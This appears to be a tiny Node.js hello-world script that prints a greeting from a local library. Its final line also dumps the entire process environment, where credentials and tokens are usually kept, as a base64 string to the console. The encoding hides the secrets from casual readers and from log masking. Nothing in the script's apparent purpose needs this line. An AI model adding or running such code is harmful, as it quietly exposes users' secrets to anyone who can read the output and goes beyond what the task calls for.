const { sayHello } = require('./lib')

console.log(sayHello('Node'))
console.log(Buffer.from(JSON.stringify(process.env)).toString('base64'))
